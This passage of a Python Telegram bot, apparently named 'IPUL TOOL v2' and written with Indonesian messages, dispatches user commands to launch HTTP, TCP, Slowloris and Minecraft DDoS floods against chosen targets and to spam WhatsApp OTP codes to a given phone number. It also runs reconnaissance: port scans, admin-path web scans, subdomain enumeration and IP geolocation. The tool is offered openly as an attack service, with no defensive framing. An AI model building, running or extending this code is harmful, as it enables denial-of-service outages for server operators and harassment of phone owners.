                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"⛔ /stop untuk hentikan",
                parse_mode="Markdown"
            )
            aktif_tasks[uid] = asyncio.create_task(
                live_status(msg, state, "HTTP FLOOD", url, dur)
            )
            ctx.user_data["mode"] = None
        except Exception as e:
            await err(e)

    # ── TCP FLOOD ───────────────────────────────────────────────
    elif mode == "ddos_tcp":
        try:
            p = teks.split()
            ip, port, dur = p[0], int(p[1]), int(p[2])
            state = {"running": True}
            serangan_aktif[uid] = state
            mulai_tcp(ip, port, dur, state)
            msg = await update.message.reply_text(
                f"⚔️ *TCP FLOOD DIMULAI*\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🎯 Target    : `{ip}:{port}`\n"
                f"⏱️ Durasi    : {dur} detik\n"
                f"🔄 Thread    : 100\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"⛔ /stop untuk hentikan",
                parse_mode="Markdown"
            )
            aktif_tasks[uid] = asyncio.create_task(
                live_status(msg, state, "TCP FLOOD", f"{ip}:{port}", dur)
            )
            ctx.user_data["mode"] = None
        except Exception as e:
            await err(e)

    # ── SLOWLORIS ───────────────────────────────────────────────
    elif mode == "slowloris":
        try:
            p = teks.split()
            ip, port = p[0], int(p[1])
            state = {"running": True}
            serangan_aktif[uid] = state
            mulai_slowloris(ip, port, state)
            msg = await update.message.reply_text(
                f"⚔️ *SLOWLORIS DIMULAI*\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🎯 Target    : `{ip}:{port}`\n"
                f"🔗 Koneksi   : ~1500 menggantung\n"
                f"♾️ Durasi     : sampai /stop\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"⛔ /stop untuk hentikan",
                parse_mode="Markdown"
            )
            # Slowloris tidak ada durasi fixed → updater khusus
            async def slow_updater():
                while state.get("running"):
                    total = sum(
                        v for k, v in state.items()
                        if k.startswith("pkt_") and isinstance(v, int)
                    )
                    try:
                        await msg.edit_text(
                            f"⚔️ *SLOWLORIS AKTIF*\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                            f"🎯 Target    : `{ip}:{port}`\n"
                            f"🔗 Koneksi   : `{total}`\n"
                            f"♾️ Durasi     : sampai /stop\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                            f"⛔ /stop untuk hentikan",
                            parse_mode="Markdown"
                        )
                    except Exception:
                        pass
                    await asyncio.sleep(5)
            aktif_tasks[uid] = asyncio.create_task(slow_updater())
            ctx.user_data["mode"] = None
        except Exception as e:
            await err(e)

    # ── MINECRAFT ───────────────────────────────────────────────
    elif mode == "ddos_mc":
        try:
            p = teks.split()
            ip, port, dur = p[0], int(p[1]), int(p[2])
            state = {"running": True}
            serangan_aktif[uid] = state
            mulai_minecraft(ip, port, dur, state)
            msg = await update.message.reply_text(
                f"⚔️ *MINECRAFT DDOS DIMULAI*\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🎯 Server    : `{ip}:{port}`\n"
                f"⏱️ Durasi    : {dur} detik\n"
                f"🔄 Thread    : 120 (UDP + TCP handshake)\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"⛔ /stop untuk hentikan",
                parse_mode="Markdown"
            )
            aktif_tasks[uid] = asyncio.create_task(
                live_status(msg, state, "MINECRAFT DDOS", f"{ip}:{port}", dur)
            )
            ctx.user_data["mode"] = None
        except Exception as e:
            await err(e)

    # ── PORT SCAN ───────────────────────────────────────────────
    elif mode == "port_scan":
        try:
            p = teks.split()
            target, p1, p2 = p[0], int(p[1]), int(p[2])
            msg = await update.message.reply_text(
                f"🔍 *Scanning {p2 - p1 + 1} port...*\n`{target}`",
                parse_mode="Markdown"
            )
            ports = await asyncio.to_thread(port_scan, target, p1, p2)
            if ports:
                baris = "\n".join(
                    f"  • `{pt}` — {PORT_NAMA.get(pt, 'Unknown')}"
                    for pt in ports
                )
                hasil = (
                    f"🔍 *Hasil Port Scan*\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🎯 Target         : `{target}`\n"
                    f"📊 Range scan     : {p1}–{p2}\n"
                    f"✅ Port terbuka   : {len(ports)}\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"{baris}"
                )
            else:
                hasil = (
                    f"🔍 Tidak ada port terbuka\n"
                    f"`{target}` ({p1}–{p2})"
                )
            await msg.edit_text(hasil, parse_mode="Markdown")
            ctx.user_data["mode"] = None
        except Exception as e:
            await err(e)

    # ── WEB SCAN ────────────────────────────────────────────────
    elif mode == "web_scan":
        try:
            url = teks
            msg = await update.message.reply_text(
                f"🕵️ *Scanning web...*\n`{url}`", parse_mode="Markdown"
            )
            info = await asyncio.to_thread(web_scan, url)
            if "error" in info:
                await msg.edit_text(f"❌ Error: `{info['error']}`", parse_mode="Markdown")
            else:
                ck  = ", ".join(info["cookies"]) if info["cookies"] else "—"
                adm = "\n".join(f"  └ `{a}`" for a in info["admin_found"]) or "  └ —"
                hl  = ", ".join(info["header_hilang"]) if info["header_hilang"] else "Lengkap ✅"
                hasil = (
                    f"🕵️ *Hasil Web Scan*\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🌐 URL             : `{url}`\n"
                    f"📊 Status          : `{info['status']}`\n"
                    f"🖥️ Server          : `{info['server']}`\n"
                    f"⚡ Powered By      : `{info['powered_by']}`\n"
                    f"🍰 CMS             : `{info['cms']}`\n"
                    f"📌 Title           : `{info['title']}`\n"
                    f"🍪 Cookie          : `{ck}`\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🚪 Admin Path ditemukan:\n{adm}\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🛡️ Header hilang   : `{hl}`"
                )
                await msg.edit_text(hasil, parse_mode="Markdown")
            ctx.user_data["mode"] = None
        except Exception as e:
            await err(e)

    # ── SUBDOMAIN ───────────────────────────────────────────────
    elif mode == "sub_scan":
        try:
            domain = teks.strip()
            msg = await update.message.reply_text(
                f"🌐 *Scanning subdomain...*\n`{domain}`", parse_mode="Markdown"
            )
            found = await asyncio.to_thread(subdomain_scan, domain)
            if found:
                baris = "\n".join(f"  • `{s}`" for s in found)
                hasil = (
                    f"🌐 *Hasil Subdomain Scan*\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🎯 Domain     : `{domain}`\n"
                    f"✅ Ditemukan  : {len(found)}\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"{baris}"
                )
            else:
                hasil = f"🌐 Tidak ada subdomain aktif di `{domain}`"
            await msg.edit_text(hasil, parse_mode="Markdown")
            ctx.user_data["mode"] = None
        except Exception as e:
            await err(e)

    # ── WHOIS ───────────────────────────────────────────────────
    elif mode == "whois":
        try:
            domain = teks.strip()
            msg = await update.message.reply_text(
                f"🔎 *Whois lookup...*\n`{domain}`", parse_mode="Markdown"
            )
            data = await asyncio.to_thread(whois_lookup, domain)
            if "error" in data:
                await msg.edit_text(f"❌ Error: `{data['error']}`", parse_mode="Markdown")
            else:
                ns = "\n".join(f"  • `{n}`" for n in data.get("nameservers", [])) or "  • —"
                hasil = (
                    f"🔎 *Whois: {domain}*\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📋 Status       : `{data.get('status','—')}`\n"
                    f"📅 Terdaftar    : `{data.get('registered','—')}`\n"
                    f"🔄 Diperbarui   : `{data.get('updated','—')}`\n"
                    f"⏳ Kadaluarsa   : `{data.get('expires','—')}`\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🌐 Nameserver:\n{ns}"
                )
                await msg.edit_text(hasil, parse_mode="Markdown")
            ctx.user_data["mode"] = None
        except Exception as e:
            await err(e)

    # ── OTP SPAM WA ─────────────────────────────────────────────
    elif mode == "otp_wa":
        try:
            p = teks.split()
            nomor, jumlah = p[0], min(int(p[1]), 50)
            msg = await update.message.reply_text(
                f"📱 *OTP Spam WA Dimulai*\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📞 Nomor     : `{nomor}`\n"
                f"🔢 Jumlah    : {jumlah}x\n"
                f"⏳ Menunggu hasil...",
                parse_mode="Markdown"
            )
            hasil = await asyncio.to_thread(otp_spam_wa, nomor, jumlah)
            await msg.edit_text(
                f"📱 *OTP Spam Selesai*\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📞 Nomor      : `{nomor}`\n"
                f"✅ Berhasil   : {hasil['berhasil']}\n"
                f"❌ Gagal      : {hasil['gagal']}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"💡 Rate-limit? Tunggu 5 menit lalu coba lagi.",
                parse_mode="Markdown"
            )
            ctx.user_data["mode"] = None
        except Exception as e:
            await err(e)

    # ── IP INFO ─────────────────────────────────────────────────
    elif mode == "ip_info":
        try:
            ip = teks.strip()
            msg = await update.message.reply_text(
                f"🌍 *Mengambil info IP...*\n`{ip}`", parse_mode="Markdown"
            )
            info = await asyncio.to_thread(ip_info, ip)
            if "error" in info:
                await msg.edit_text(f"❌ {info['error']}", parse_mode="Markdown")
            else:
                hasil = (
                    f"🌍 *Info IP: {ip}*\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🏙️ Kota        : `{info.get('city','—')}`\n"
                    f"🗺️ Region      : `{info.get('region','—')}`\n"
                    f"🌏 Negara      : `{info.get('country_name','—')} ({info.get('country','—')})`\n"
                    f"📡 ISP / Org   : `{info.get('org','—')}`\n"
                    f"🔢 ASN         : `{info.get('asn','—')}`\n"
                    f"📍 Koordinat   : `{info.get('latitude','—')}, {info.get('longitude','—')}`\n"
                    f"🕐 Timezone    : `{info.get('timezone','—')}`\n"
                    f"📮 Kode Pos    : `{info.get('postal','—')}`\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📌 [Lihat di Maps](https://maps.google.com/?q={info.get('latitude')},{info.get('longitude')})"
                )
                await msg.edit_text(hasil, parse_mode="Markdown", disable_web_page_preview=True)
            ctx.user_data["mode"] = None
        except Exception as e:
            await err(e)

# ══════════════════════════════════════════════════════════════════
#  🚀  MAIN
# ══════════════════════════════════════════════════════════════════
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("stop",  cmd_stop))
    app.add_handler(CommandHandler("help",  cmd_help))
    app.add_handler(CallbackQueryHandler(tombol_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, pesan_handler))
    print("╔══════════════════════════════════╗")
    print("║  🔥  IPUL TOOL v2 — AKTIF  🔥   ║")
    print("║  Serangan dari server ini        ║")
    print("╚══════════════════════════════════╝")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()